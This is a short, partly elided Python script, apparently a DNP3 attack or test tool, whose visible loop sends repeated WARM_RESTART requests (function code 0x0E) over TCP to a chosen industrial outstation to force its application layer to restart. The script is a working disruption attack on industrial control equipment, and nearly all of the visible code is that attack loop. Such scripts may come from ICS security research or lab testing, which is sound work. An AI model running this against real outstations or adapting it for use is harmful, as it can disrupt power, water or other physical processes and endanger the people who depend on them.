"""WARM_RESTART — FC 0x0E. Forces the outstation app layer to restart."""
...
def main():
    ...
    a = p.parse_args()
    print(f"[{now()}] WARM_RESTART start x{a.count}")
    for i in range(a.count):
        send_tcp(app_request(MASTER_ADDR, OUTSTATION_ADDR, 0x0E, b"", seq=i & 0x0F),
                 a.host, a.port)
        time.sleep(a.interval)
    print(f"[{now()}] WARM_RESTART stop")
